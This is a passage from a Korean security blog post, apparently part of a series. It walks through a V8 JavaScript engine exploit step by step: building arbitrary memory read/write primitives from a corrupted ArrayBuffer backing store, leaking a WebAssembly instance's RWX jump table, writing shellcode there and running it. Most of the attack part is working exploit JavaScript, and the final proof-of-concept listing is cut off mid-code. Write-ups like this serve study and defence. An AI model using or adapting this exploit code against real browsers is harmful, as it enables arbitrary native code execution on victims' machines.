id="WebAssembly-&#xAE30;&#xBCF8;-&#xC6D0;&#xB9AC;"><a href="#WebAssembly-&#xAE30;&#xBCF8;-&#xC6D0;&#xB9AC;" class="headerlink" title="WebAssembly &#xAE30;&#xBCF8; &#xC6D0;&#xB9AC;"></a>WebAssembly &#xAE30;&#xBCF8; &#xC6D0;&#xB9AC;</h3><p>WebAssembly&#xB294; &#xBE0C;&#xB77C;&#xC6B0;&#xC800; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC800;&#xC218;&#xC900; &#xC5B8;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC124;&#xACC4;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xD3EC;&#xB9F7; &#xC5B8;&#xC5B4;&#xC785;&#xB2C8;&#xB2E4;. &#xC8FC;&#xB85C; C/C++&#xACFC; &#xAC19;&#xC740; &#xC5B8;&#xC5B4;&#xB97C; &#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xD560; &#xB54C; &#xD65C;&#xC6A9;&#xB418;&#xBA70;, &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC640; &#xC0C1;&#xD638;&#xC791;&#xC6A9;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>V8 &#xC5D4;&#xC9C4;&#xC740; wasm &#xCF54;&#xB4DC;&#xB97C; &#xCC98;&#xC74C;&#xBD80;&#xD130; &#xCD5C;&#xC801;&#xD654;&#xB41C; &#xD615;&#xD0DC;&#xB85C; JIT &#xCEF4;&#xD30C;&#xC77C;&#xD558;&#xC9C0; &#xC54A;&#xACE0;, &#xBA3C;&#xC800; <strong>Liftoff</strong>&#xB77C;&#xB294; &#xBCA0;&#xC774;&#xC2A4;&#xB77C;&#xC778; &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xB85C; 1&#xCC28; &#xCEF4;&#xD30C;&#xC77C;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. wasm &#xB610;&#xD55C; JIT &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBBC0;&#xB85C; RWX &#xAD8C;&#xD55C;&#xC774; &#xBD80;&#xC5EC;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC; &#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xAE30;&#xACC4;&#xC5B4; &#xCF54;&#xB4DC;&#xAC00; &#xAE30;&#xB85D;&#xB429;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; asm.js&#xC640;&#xC758; &#xD638;&#xD658;&#xC131; &#xBB38;&#xC81C; &#xB54C;&#xBB38;&#xC5D0; wasm&#xC5D0; &#xB300;&#xD55C; write-protect &#xD50C;&#xB798;&#xADF8;&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xAEBC;&#xC838; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; wasm&#xC740; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC5D0;&#xC11C; &#xB9E4;&#xC6B0; &#xC720;&#xC6A9;&#xD55C; &#xB3C4;&#xAD6C;&#xAC00; &#xB429;&#xB2C8;&#xB2E4;.</p><p>V8&#xC5D0;&#xC11C; wasm &#xBAA8;&#xB4C8;&#xC774; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xD654;&#xB418;&#xBA74;, &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC740; <strong>Jump Table</strong>&#xC744; &#xD1B5;&#xD574; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. Jump Table&#xC740; &#xAC01; &#xD568;&#xC218; &#xC2AC;&#xB86F;&#xC774; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xC758; &#xC2E4;&#xC81C; &#xAE30;&#xACC4;&#xC5B4; &#xCF54;&#xB4DC; &#xD3EC;&#xC778;&#xD130;(WasmCode &#xAC1D;&#xCCB4;)&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB3C4;&#xB85D; &#xAD6C;&#xC131;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xD3EC;&#xC778;&#xD130;&#xB294; RWX &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xBBC0;&#xB85C; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC774;&#xB97C; &#xB36E;&#xC5B4;&#xC50C;&#xC6CC; &#xC784;&#xC758;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. (2018&#xB144; &#xB2F9;&#xC2DC; V8 &#xD799;&#xC758; &#xC810;&#xD504; &#xD14C;&#xC774;&#xBE14;&#xC740; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30; &#xBC0F; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xC5EC; &#xCF54;&#xB4DC; &#xD558;&#xC774;&#xC7AC;&#xD0B9;&#xC5D0; &#xC6A9;&#xC774;&#xD588;&#xB294;&#xB370; &#xC9C0;&#xAE08;&#xC740; &#xC544;&#xB2D9;&#xB2C8;&#xB2E4;..&#x315C;.&#x315C;)</p><h3 id="addrOf-&#xD568;&#xC218;-re-building"><a href="#addrOf-&#xD568;&#xC218;-re-building" class="headerlink" title="addrOf &#xD568;&#xC218; re-building"></a>addrOf &#xD568;&#xC218; re-building</h3><p>&#xC774;&#xC81C; &#xC6B0;&#xB9AC;&#xAC00; &#xB9CC;&#xB4E0; read/write primitive&#xB97C; &#xD65C;&#xC6A9;&#xD574; wasm &#xC778;&#xC2A4;&#xD134;&#xC2A4; &#xAC1D;&#xCCB4;&#xC758; &#xC8FC;&#xC18C;&#xC640; RWX &#xC810;&#xD504; &#xD14C;&#xC774;&#xBE14; &#xD3EC;&#xC778;&#xD130;&#xB97C; leak&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB9CC; &#xAE30;&#xC874; addrOf primitive&#xB294; &#xD504;&#xB85C;&#xD37C;&#xD2F0;&#xB97C; overlapping&#xD574;&#xC11C; &#xB36E;&#xC5B4;&#xC368;&#xC57C; &#xD574;&#xC11C; &#xB2E4;&#xB978; &#xAE30;&#xB2A5;&#xC744; &#xB9DD;&#xAC00;&#xB728;&#xB9B4; &#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C;, &#xC0C8;&#xB85C;&#xC6B4; &#xBC29;&#xBC95;&#xC774; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC704;&#xD574; ArrayBuffer&#xC5D0; <strong>out-of-line property</strong> &#xB97C; &#xCD94;&#xAC00;&#xD558;&#xACE0; &#xAC1D;&#xCCB4;&#xB97C; &#xCC38;&#xC870;&#xC2DC;&#xD0A8; &#xB4A4;, &#xD504;&#xB85C;&#xD37C;&#xD2F0; &#xBC30;&#xC5F4;&#xC758; &#xC624;&#xD504;&#xC14B;&#xC744; &#xC77D;&#xC5B4; &#xAC1D;&#xCCB4; &#xC8FC;&#xC18C;&#xB97C; &#xC720;&#xCD9C;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xAE30;&#xBC95;&#xC744; &#xD1B5;&#xD574; &#xC0C8;&#xB85C;&#xC6B4; <code>addrOf</code> &#xAD6C;&#xD604;&#xC744; &#xC644;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p>&#xC774;&#xC720;_<br>ArrayBuffer&#xB294; &#xC790;&#xCCB4;&#xC801;&#xC73C;&#xB85C; raw &#xBC14;&#xC774;&#xD2B8; &#xBC84;&#xD37C;&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xBA70;, &#xC778;&#xB77C;&#xC778; &#xD504;&#xB85C;&#xD37C;&#xD2F0;&#xC640; &#xBCC4;&#xB3C4;&#xB85C; <strong>&#xD504;&#xB85C;&#xD37C;&#xD2F0; &#xC800;&#xC7A5;&#xC18C;(property store)</strong> &#xB97C; &#xAC00;&#xC9D1;&#xB2C8;&#xB2E4;. &#xC774; &#xD504;&#xB85C;&#xD37C;&#xD2F0; &#xC800;&#xC7A5;&#xC18C;&#xC5D0; out-of-line &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xAC1D;&#xCCB4;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xBA74;, &#xADF8; &#xC800;&#xC7A5;&#xC18C; &#xB0B4;&#xBD80;&#xC5D0; &#xAC1D;&#xCCB4;&#xC5D0; &#xB300;&#xD55C; &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xBCF4;&#xAD00;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xBBF8; &#xD655;&#xBCF4;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xC77D;&#xAE30; &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB97C; &#xD1B5;&#xD574; &#xC774; &#xD504;&#xB85C;&#xD37C;&#xD2F0; &#xC800;&#xC7A5;&#xC18C;&#xC758; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130;&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xBA74;, &#xD574;&#xB2F9; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xAC04;&#xC811;&#xC801;&#xC73C;&#xB85C; &#xD68D;&#xB4DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC989;, &#xC9C1;&#xC811; &#xAC1D;&#xCCB4; &#xD544;&#xB4DC;&#xB97C; &#xB36E;&#xC5B4;&#xC4F0;&#xC9C0; &#xC54A;&#xACE0;&#xB3C4; &#xAC1D;&#xCCB4;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xC720;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p></blockquote><pre><code class="hljs jsx"><span class="hljs-keyword">let</span> memory = {  addrOf(obj) {    <span class="hljs-comment">// Set object address to new out-of-line property called leakme</span>    arrBuf2.leakMe = obj;    <span class="hljs-comment">// Use read64 primitive to leak the properties backing store address of our array buffer</span>    <span class="hljs-keyword">let</span> props = <span class="hljs-built_in">this</span>.read64(arrBuf2Addr + <span class="hljs-number">8n</span>) - <span class="hljs-number">1n</span>;    <span class="hljs-comment">// Read offset 16 from the array buffer backing store and return the address of our object</span>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.read64(props + <span class="hljs-number">16n</span>) - <span class="hljs-number">1n</span>;  }};</code></pre><p>&#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD574;&#xC11C; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; <code>wasmInstance</code> &#xC640; &#xADF8; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xC758; RWX jump table &#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC8FC;&#xC18C;&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><h2 id="1-3-RCE-PoC"><a href="#1-3-RCE-PoC" class="headerlink" title="1.3. RCE PoC"></a>1.3. RCE PoC</h2><p>&#xC774;&#xC81C; &#xC9C0;&#xAE08;&#xAE4C;&#xC9C0;&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xD569;&#xCCD0;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="1-primitive-&#xAD6C;&#xCD95;"><a href="#1-primitive-&#xAD6C;&#xCD95;" class="headerlink" title="[1] primitive &#xAD6C;&#xCD95;"></a>[1] primitive &#xAD6C;&#xCD95;</h3><p>2&#xBC88;&#xC9F8; ArrayBuffer&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xC54C;&#xC544;&#xB0B4;&#xACE0;(<code>addOf</code>) 1&#xBC88;&#xC9F8; &#xBC84;&#xD37C;&#xC758; backing store pointer&#xB97C; 2&#xBC88;&#xC9F8; ArrayBuffer&#xC758; &#xC8FC;&#xC18C;&#xB85C; &#xBCC0;&#xACBD;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC774;&#xB97C; &#xD1A0;&#xB300;&#xB85C; Memory Read/Write primitive&#xB97C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-comment">// Create Array Buffers</span><span class="hljs-keyword">let</span> arrBuf1 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">1024</span>);<span class="hljs-keyword">let</span> arrBuf2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">1024</span>);<span class="hljs-comment">// Leak Address of arrBuf2</span>print(<span class="hljs-string">&quot;[+] Leaking ArrayBuffer Address...&quot;</span>);<span class="hljs-keyword">let</span> arrBuf2Addr = addrOf(arrBuf2);print(<span class="hljs-string">`[+] ArrayBuffer Address @ 0x<span class="hljs-subst">${arrBuf2Addr.toString(<span class="hljs-number">16</span>)}</span>`</span>);<span class="hljs-comment">// Corrupt Backing Store Pointer of arrBuf1 with Address to arrBuf2</span>print(<span class="hljs-string">&quot;[+] Corrupting ArrayBuffer Backing Store...&quot;</span>)<span class="hljs-keyword">let</span> originalArrBuf1BackingStore = fakeObj(arrBuf1, arrBuf2Addr);<span class="hljs-comment">// Store Original Backing Store Pointer of arrBuf2</span><span class="hljs-keyword">let</span> view1 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf1)<span class="hljs-keyword">let</span> originalArrBuf2BackingStore = view1[<span class="hljs-number">4</span>]<span class="hljs-comment">// Construct Memory Primitives via Array Buffers</span><span class="hljs-keyword">let</span> memory = {  write(addr, bytes) {    view1[<span class="hljs-number">4</span>] = addr;    <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>(arrBuf2);    view2.set(bytes);  },  read64(addr) {    view1[<span class="hljs-number">4</span>] = addr;    <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf2);    <span class="hljs-keyword">return</span> view2[<span class="hljs-number">0</span>];  },  write64(addr, ptr) {    view1[<span class="hljs-number">4</span>] = addr;    <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf2);    view2[<span class="hljs-number">0</span>] = ptr;  },  addrOf(obj) {    arrBuf2.leakMe = obj;    <span class="hljs-keyword">let</span> props = <span class="hljs-built_in">this</span>.read64(arrBuf2Addr + <span class="hljs-number">8n</span>) - <span class="hljs-number">1n</span>;    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.read64(props + <span class="hljs-number">16n</span>) - <span class="hljs-number">1n</span>;  }};print(<span class="hljs-string">&quot;[+] Constructed Memory Read and Write Primitive!&quot;</span>);</code></pre><h3 id="2-WebAssembly-&#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xB97C;-&#xC0DD;&#xC131;"><a href="#2-WebAssembly-&#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xB97C;-&#xC0DD;&#xC131;" class="headerlink" title="[2] WebAssembly &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xB97C; &#xC0DD;&#xC131;"></a>[2] WebAssembly &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xB97C; &#xC0DD;&#xC131;</h3><p>&#xC774; wasm &#xCF54;&#xB4DC; &#xBE14;&#xB85D;&#xC740; &#xAC04;&#xB2E8;&#xD55C; &#x201C;&#xB354;&#xBBF8; &#xD568;&#xC218;&#x201D;&#xB97C; JIT &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xCEF4;&#xD30C;&#xC77C;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xAC00; &#xC0DD;&#xC131;&#xB418;&#xBA74; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; <strong>RWX &#xAD8C;&#xD55C;&#xC744; &#xAC00;&#xC9C4; &#xC810;&#xD504; &#xD14C;&#xC774;&#xBE14;</strong>&#xC774; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4;&#xC5D0; &#xC774; RWX &#xBA54;&#xBAA8;&#xB9AC; &#xC704;&#xCE58;&#xC5D0; &#xC178;&#xCF54;&#xB4DC;&#xB97C; &#xB36E;&#xC5B4;&#xC368; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">print(<span class="hljs-string">&quot;[+] Generating a WebAssembly Instance...&quot;</span>);<span class="hljs-comment">// Generate RWX region for Shellcode via WASM</span><span class="hljs-keyword">var</span> wasmCode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>([<span class="hljs-number">0</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">109</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">133</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">96</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">127</span>,<span class="hljs-number">3</span>,<span class="hljs-number">130</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">112</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">131</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">129</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">145</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">109</span>,<span class="hljs-number">101</span>,<span class="hljs-number">109</span>,<span class="hljs-number">111</span>,<span class="hljs-number">114</span>,<span class="hljs-number">121</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">109</span>,<span class="hljs-number">97</span>,<span class="hljs-number">105</span>,<span class="hljs-number">110</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">10</span>,<span class="hljs-number">138</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">65</span>,<span class="hljs-number">42</span>,<span class="hljs-number">11</span>]);<span class="hljs-keyword">var</span> wasmModule = <span class="hljs-keyword">new</span> WebAssembly.Module(wasmCode);<span class="hljs-keyword">var</span> wasmInstance = <span class="hljs-keyword">new</span> WebAssembly.Instance(wasmModule);<span class="hljs-keyword">var</span> func = wasmInstance.exports.main;</code></pre><h3 id="3-RWX-&#xC810;&#xD504;-&#xD14C;&#xC774;&#xBE14;-&#xD3EC;&#xC778;&#xD130;-&#xC8FC;&#xC18C;-&#xD68D;&#xB4DD;"><a href="#3-RWX-&#xC810;&#xD504;-&#xD14C;&#xC774;&#xBE14;-&#xD3EC;&#xC778;&#xD130;-&#xC8FC;&#xC18C;-&#xD68D;&#xB4DD;" class="headerlink" title="[3] RWX &#xC810;&#xD504; &#xD14C;&#xC774;&#xBE14; &#xD3EC;&#xC778;&#xD130; &#xC8FC;&#xC18C; &#xD68D;&#xB4DD;"></a>[3] RWX &#xC810;&#xD504; &#xD14C;&#xC774;&#xBE14; &#xD3EC;&#xC778;&#xD130; &#xC8FC;&#xC18C; &#xD68D;&#xB4DD;</h3><p>&#xC55E;&#xC5D0;&#xC11C; &#xB9CC;&#xB4E0; primitive&#xB97C; &#xC774;&#xC6A9;&#xD574;&#xC11C; wasm &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xD68D;&#xB4DD;&#xD569;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs jsx"><span class="hljs-comment">// Leak WebAssembly Instance Address and Jump Table Start Pointer</span>print(<span class="hljs-string">&quot;[+] Leaking WebAssembly Instance Address...&quot;</span>);<span class="hljs-keyword">let</span> wasmInstanceAddr = memory.addrOf(wasmInstance);print(<span class="hljs-string">`[+] WebAssembly Instance Address @ 0x<span class="hljs-subst">${wasmInstanceAddr.toString(<span class="hljs-number">16</span>)}</span>`</span>);<span class="hljs-keyword">let</span> wasmRWXAddr = memory.read64(wasmInstanceAddr + <span class="hljs-number">0xF0n</span>);print(<span class="hljs-string">`[+] WebAssembly RWX Jump Table Address @ 0x<span class="hljs-subst">${wasmRWXAddr.toString(<span class="hljs-number">16</span>)}</span>`</span>);</code></pre><h3 id="4-&#xC258;&#xCF54;&#xB4DC;-&#xC0BD;&#xC785;"><a href="#4-&#xC258;&#xCF54;&#xB4DC;-&#xC0BD;&#xC785;" class="headerlink" title="[4] &#xC258;&#xCF54;&#xB4DC; &#xC0BD;&#xC785;"></a>[4] &#xC258;&#xCF54;&#xB4DC; &#xC0BD;&#xC785;</h3><p>&#xBA3C;&#xC800; <code>wasmInstance</code> &#xAC1D;&#xCCB4;&#xC758; &#xC8FC;&#xC18C;&#xC5D0; <code>0xf0</code> &#xC624;&#xD504;&#xC14B;&#xC744; &#xB354;&#xD574; <strong>&#xC810;&#xD504; &#xD14C;&#xC774;&#xBE14; &#xD3EC;&#xC778;&#xD130;</strong>&#xB97C; &#xC77D;&#xC5B4;&#xC635;&#xB2C8;&#xB2E4;. <code>read64</code>&#xB97C; &#xD1B5;&#xD574; &#xD574;&#xB2F9; RWX &#xC8FC;&#xC18C;&#xB97C; &#xC5BB;&#xC740; &#xB4A4;, &#xC258;&#xCF54;&#xB4DC;&#xB97C; &#xADF8; &#xC704;&#xCE58;&#xC5D0; &#xC791;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-comment">// Leak WebAssembly Instance Address and Jump Table Start Pointer</span>print(<span class="hljs-string">&quot;[+] Leaking WebAssembly Instance Address...&quot;</span>);<span class="hljs-keyword">let</span> wasmInstanceAddr = memory.addrOf(wasmInstance);print(<span class="hljs-string">`[+] WebAssembly Instance Address @ 0x<span class="hljs-subst">${wasmInstanceAddr.toString(<span class="hljs-number">16</span>)}</span>`</span>);<span class="hljs-keyword">let</span> wasmRWXAddr = memory.read64(wasmInstanceAddr + <span class="hljs-number">0xF0n</span>);print(<span class="hljs-string">`[+] WebAssembly RWX Jump Table Address @ 0x<span class="hljs-subst">${wasmRWXAddr.toString(<span class="hljs-number">16</span>)}</span>`</span>);print(<span class="hljs-string">&quot;[+] Preparing Shellcode...&quot;</span>);<span class="hljs-comment">// Prepare Calc Shellcode</span><span class="hljs-keyword">let</span> shellcode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>([<span class="hljs-number">0x48</span>,...print(<span class="hljs-string">&quot;[+] Writing Shellcode to Jump Table Address...&quot;</span>);<span class="hljs-comment">// Write Shellcode to Jump Table Start Address</span>memory.write(wasmRWXAddr, shellcode);</code></pre><h3 id="5-wasm-&#xD568;&#xC218;&#xB97C;-&#xD638;&#xCD9C;&#xD558;&#xC5EC;-&#xC178;&#xCF54;&#xB4DC;&#xB97C;-&#xC2E4;&#xD589;"><a href="#5-wasm-&#xD568;&#xC218;&#xB97C;-&#xD638;&#xCD9C;&#xD558;&#xC5EC;-&#xC178;&#xCF54;&#xB4DC;&#xB97C;-&#xC2E4;&#xD589;" class="headerlink" title="[5] wasm &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xC178;&#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;"></a>[5] wasm &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xC178;&#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;</h3><p>&#xB9C8;&#xC9C0;&#xB9C9; &#xB2E8;&#xACC4;&#xB294; &#xB2E8;&#xC21C;&#xD788; <code>wasm</code> &#xD568;&#xC218;(<code>main</code>)&#xC744; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xC810;&#xD504; &#xD14C;&#xC774;&#xBE14;&#xC774; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xC8FC;&#xC18C;&#xC5D0;&#xB294; &#xC774;&#xBBF8; &#xC258;&#xCF54;&#xB4DC;&#xB85C; &#xBC14;&#xB00C;&#xC5C8;&#xC73C;&#xBBC0;&#xB85C;, &#xD638;&#xCD9C;&#xACFC; &#xB3D9;&#xC2DC;&#xC5D0; &#xC178;&#xCF54;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-comment">// Execute our Shellcode</span>print(<span class="hljs-string">&quot;[+] Popping Calc...&quot;</span>);func();</code></pre><p>&#xC774;&#xB85C;&#xC368; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC5D0;&#xC11C; &#xC2DC;&#xC791;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC2E4;&#xC81C; &#xB124;&#xC774;&#xD2F0;&#xBE0C; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9C0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC74C;&#xC740; &#xC704; &#xB0B4;&#xC6A9;&#xC744; &#xBC18;&#xC601;&#xD55C; &#xCD5C;&#xC885;&#xC801;&#xC778; poc &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</p><blockquote><p>Part 1. &#xC5D0;&#xC11C; &#xC774;&#xC57C;&#xAE30;&#xD588;&#xB2E4;&#xC2DC;&#xD53C; &#xC704; &#xC2E4;&#xC2B5;&#xC740; Linux &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC9C4;&#xD589;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xB798;&#xB294; Linux PoC Code&#xC785;&#xB2C8;&#xB2E4;.</p></blockquote><pre><code class="hljs jsx"><span class="hljs-comment">// Conversion Buffers</span><span class="hljs-keyword">let</span> floatView = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Float64Array</span>(<span class="hljs-number">1</span>);<span class="hljs-keyword">let</span> uint64View = <span class="hljs-keyword">new</span> BigUint64Array(floatView.buffer);<span class="hljs-built_in">Number</span>.prototype.toBigInt = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toBigInt</span>(<span class="hljs-params"></span>) </span>{    floatView[<span class="hljs-number">0</span>] = <span class="hljs-built_in">this</span>;    <span class="hljs-keyword">return</span> uint64View[<span class="hljs-number">0</span>];};BigInt.prototype.toNumber = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toNumber</span>(<span class="hljs-params"></span>) </span>{    uint64View[<span class="hljs-number">0</span>] = <span class="hljs-built_in">this</span>;    <span class="hljs-keyword">return</span> floatView[<span class="hljs-number">0</span>];};<span class="hljs-comment">// Function that creates an object with one in-line and 32 out-of-line properties</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">makeObj</span>(<span class="hljs-params">pValues</span>) </span>{    <span class="hljs-keyword">let</span> obj = {        inline: <span class="hljs-number">1234</span>    };    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) {        <span class="hljs-built_in">Object</span>.defineProperty(obj, <span class="hljs-string">&apos;p&apos;</span> + i, {            writable: <span class="hljs-literal">true</span>,            value: pValues[i]        });    }    <span class="hljs-keyword">return</span> obj;}<span class="hljs-comment">// Function to find overlapping properties</span><span class="hljs-keyword">let</span> p1, p2;<span class="hljs-function"><span class="hljs-keyword">function</span> <span 